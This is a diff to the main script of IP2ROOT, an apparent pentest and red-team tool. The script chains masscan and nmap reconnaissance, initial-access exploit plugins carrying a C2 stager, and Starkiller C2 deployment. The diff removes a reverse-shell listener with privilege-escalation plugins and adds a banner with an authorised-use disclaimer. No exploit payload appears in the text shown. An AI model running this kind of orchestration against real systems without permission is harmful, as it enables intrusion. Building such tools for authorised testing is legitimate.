@@ -3,7 +3,6 @@ import socket
 import recon
 import socket
 from multiprocessing import Process
-import rs_client
 import sys
 import configparser
 import os
@@ -11,8 +10,8 @@ import sys
 from utils import *
 from plugins.initial_access import *
 import constants
-import privesc
 import c2
+from pyfiglet import Figlet
 
 def read_plugins_configs() -> dict:
     """
@@ -37,28 +36,6 @@ def read_plugins_configs() -> dict:
     return configs
 
 
-def listener(listener_port: int, listener_address: str, compromission_recap_file_name: str) -> None:
-    """
-    Create a listener that waits for a connection from the reverse shell
-    """
-    sys.stdin = open(0)
-    persistent = False
-    hosts = None
-    sock = None
-
-    if hosts:
-        hosts = hosts.split(",")
-
-    try:
-        sock = rs_client.Socket(listener_port, listener_address)
-        sock.listen(hosts)
-        shell = rs_client.Shell(sock, persistent)
-        privesc.load_all_plugins(sock, shell, compromission_recap_file_name)
-
-    except KeyboardInterrupt:
-        sock.close()
-
-
 def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: str, target_port: int, local_ip: str, local_port: int, compromission_recap_file_name: str, token: str) -> None:
     """
     Run an initial access plugin
@@ -68,7 +45,7 @@ def run_initial_access_plugin(plugin_name: str, plugin_config:list, target_ip: s
         rs = c2.get_stager(safe_get(plugin_config, 'OS'), token)
         res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port, rs)
         if res is True:
-            ('[+] Exploit was successful !')
+            print('[+] Exploit was successful !')
             if compromission_recap_file_name:
                 with open(compromission_recap_file_name, 'w') as report:
                     report.write('# IP2ROOT report\n\n')
@@ -100,8 +77,14 @@ def extract_ip() -> None | str:
     return IP
 
 
-
 def main() -> None | str:
+
+    f = Figlet(font='slant')
+    print(f.renderText('IP2ROOT'))
+    print('\033[1m' + 'By 0xblank, Steels, Lebansx, Koko' + '\033[0m\n')
+    print('\033[1m' + '/!\ DISCLAIMER /!\ ' + '\033[0m')
+    print("The tool has been created to help pentesters and redteamers and should only be used against targets you have rights on. We are not responsible of the actions done by your usage of the tool.\n")
+
     configs = read_plugins_configs()
     parser = argparse.ArgumentParser()
 
@@ -113,9 +96,6 @@ def main() -> None | str:
     parser.add_argument('-f', '--fast-scan', action='store_true', help='increase masscan\'s rate limit to 100000, be careful with this option it might flood the network', required=False)
     args = parser.parse_args()
 
-    # deploy c2 and start client
-    c2_infos = c2.c2()
-    c2.starkiller()
 
     if args.local_ip == None:
         LOCAL_IP = extract_ip()
@@ -138,6 +118,10 @@ def main() -> None | str:
         if no_ports_open:
             sys.exit('[-] Error: No open ports found by masscan')
         res_recon = recon.nmap_scan(res_masscan)
+
+    # deploy c2 and start client
+    c2_infos = c2.c2(LOCAL_IP)
+    c2.starkiller()
 
     BUFFER_SIZE = 1024 * 128
     SEPARATOR = '<sep>'
@@ -164,7 +148,6 @@ def main() -> None | str:
             print("[+] Report available in {}".format(args.output))
         else : 
             print("[-] No output file provided for a report, --output <filename.md> allows to create a report")
-
 
 if __name__ == '__main__':
     main()
